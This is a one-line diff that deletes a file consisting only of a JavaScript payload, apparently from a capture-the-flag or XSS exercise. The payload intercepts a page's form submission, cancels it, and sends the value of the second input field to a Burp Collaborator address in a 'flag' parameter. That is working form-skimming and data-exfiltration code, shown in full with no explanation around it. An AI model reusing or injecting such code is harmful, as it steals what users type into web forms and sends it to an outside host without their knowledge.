@@ -1,1 +1,0 @@
-document.querySelectorAll('form')[0].addEventListener('submit',function(){event.preventDefault();fetch('https://9hr1u4dpzthf65600n9mwnosfjlo9d.burpcollaborator.net?flag='+document.querySelectorAll('input')[1].value)})
